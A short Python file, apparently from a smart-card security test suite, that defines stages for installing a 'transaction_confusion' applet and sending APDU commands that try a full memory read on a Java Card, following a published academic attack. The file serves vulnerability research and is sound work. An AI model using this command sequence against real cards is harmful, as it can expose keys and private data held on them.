class Stages:
    STAGES = [
        {
            "name": "install",
            "path": "build/{version}/transaction_confusion-{version}.cap",
        },
        {
            "name": "send",
            "comment": "INS_PREPARE1",
            "payload": "0x80 0x01 0x00 0x00 0x00",
            "optional": False,
        },
        {
            "name": "send",
            "comment": "INS_PREPARE2",
            "payload": "0x80 0x02 0x00 0x00 0x00",
            "optional": False,
        },
        # rest of the stages are defined dynamically
    ]

    payload = "0x80 0x04 {P1:02X} {P2:02X} 0x00"
    ins_read_stage = {
        "name": "send",
        "comment": "INS_READMEM",
        "optional": True,  # True, because we want to attempt to read from all the memory adresses
    }

    # randomly chosen P1 and P2 based on the regions presented in
    # Full Memory Read Attack on a Java Card by Jip Hogenboom and Wojciech Mostowski
    # e.g. http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.154.7093&rep=rep1&type=pdf
    #
    # Address range (Suspected) contents
    #   0020–0F20       system data
    #   3017–3717       RAM, system data
    #   4000–FFFF       applet data and code, GP card manager

    for P1, P2 in [(0x00, 0x50), (0x31, 0x20), (0x50, 0x20)]:
        stage = ins_read_stage.copy()
        stage["payload"] = payload.format(P1=P1, P2=P2)
        STAGES.append(stage)
